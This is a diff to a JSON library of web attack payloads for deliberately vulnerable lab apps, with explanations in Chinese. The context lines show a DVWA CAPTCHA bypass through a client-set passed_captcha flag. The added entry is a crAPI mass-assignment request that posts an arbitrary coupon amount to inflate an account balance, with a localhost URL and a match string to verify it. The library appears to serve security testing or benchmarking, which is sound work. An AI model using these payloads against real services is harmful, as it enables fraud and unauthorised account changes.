@@ -19,5 +19,18 @@
     "reference_payload": "POST /vulnerabilities/captcha/ step=2&password_new=pass1234&password_conf=pass1234&Change=Change&passed_captcha=true",
     "principle": "客户端可控 passed_captcha 标志绕过 CAPTCHA",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030200936",
+    "context": "crAPI REST /workshop/api/shop/apply_coupon — 优惠券应用端点直接绑定客户端传入的 amount 字段作为返现金额，未使用服务端固定券面值，属批量赋值/业务逻辑缺陷",
+    "reference_payload": "POST /workshop/api/shop/apply_coupon {\"coupon_code\":\"TRAC075\",\"amount\":100000}  → credit 90→100090",
+    "principle": "Mass assignment / 客户端可控 amount：服务端信任请求体的返现额度而非券的实际面值，改 amount 即无限刷余额",
+    "source": "crapi",
+    "verify_url": "http://localhost:8888/identity/api/v2/user/dashboard",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8888/identity/api/v2/user/dashboard",
+      "match": "100090"
+    }
   }
 ]
